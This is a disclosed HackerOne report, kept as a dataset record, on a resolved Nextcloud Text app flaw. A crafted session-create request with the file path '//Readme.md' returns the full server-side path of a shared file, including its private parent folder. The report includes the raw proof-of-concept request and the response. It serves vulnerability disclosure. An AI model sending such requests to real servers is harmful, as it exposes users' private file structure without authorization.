---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1246721'
original_report_id: '1246721'
title: Text app leaks file path of shared files
weakness: Information Disclosure
team_handle: nextcloud
created_at: '2021-06-28T17:37:05.228Z'
disclosed_at: '2021-08-11T09:23:35.146Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: nextcloud/text
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Text app leaks file path of shared files

## Metadata

- HackerOne Report ID: 1246721
- Weakness: Information Disclosure
- Program: nextcloud
- Disclosed At: 2021-08-11T09:23:35.146Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

By sending a request for a share without a README.md, the whole file path will be returned to the user:

```
PUT /apps/text/public/session/create?token=EHTs4P7kATowiMg HTTP/1.1
Host: cloud.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 93
Origin: https://cloud.nextcloud.com
Te: trailers
Connection: close

{"filePath":"//Readme.md","token":"EHTs4P7kATowiMg","guestName":"Bean","forceRecreate":false}
```

```
HTTP/1.1 500 Internal Server Error
Date: Mon, 28 Jun 2021 17:33:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, no-store, must-revalidate
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
X-Robots-Tag: none
Strict-Transport-Security: max-age=15768000; includeSubDomains; preload
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Content-Length: 49
Connection: close
Content-Type: application/json; charset=utf-8

"\/lukas\/files\/Private\/test-public\/Readme.md"
```

## Impact

Disclosure of the full file path. Here shared is "test-public" but it also states "Private" which is the parent folder.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
